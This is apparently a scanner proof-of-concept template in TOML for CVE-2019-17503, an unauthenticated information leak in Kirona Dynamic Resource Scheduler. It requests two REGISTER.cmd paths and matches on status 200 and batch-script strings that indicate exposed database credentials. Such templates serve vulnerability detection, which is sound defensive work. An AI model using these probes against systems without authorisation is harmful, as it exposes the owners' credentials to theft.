[info]
author = "ave"
description = "验证 Kirona Dynamic Resource Scheduler 未授权信息泄露漏洞，通过访问 /osm/REGISTER.cmd 或 /osm_tiles/REGISTER.cmd 路径，检测是否存在数据库敏感信息泄露。"
id = "POC-AVE-2019-0124"
name = "Kirona DRS Information Disclosure PoC"
severity = "medium"
tags = ["ave-2019-0124"]
vuln_id = [
    "CVE-2019-17503",
    "AVE-2019-0124",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/osm/REGISTER.cmd"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
condition = "and"
expect = true
part = "body"
type = "word"
words = [
    "DEBUGMAPSCRIPT=TRUE",
    "@echo off",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/osm_tiles/REGISTER.cmd"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
condition = "and"
expect = true
part = "body"
type = "word"
words = [
    "DEBUGMAPSCRIPT=TRUE",
    "@echo off",
]
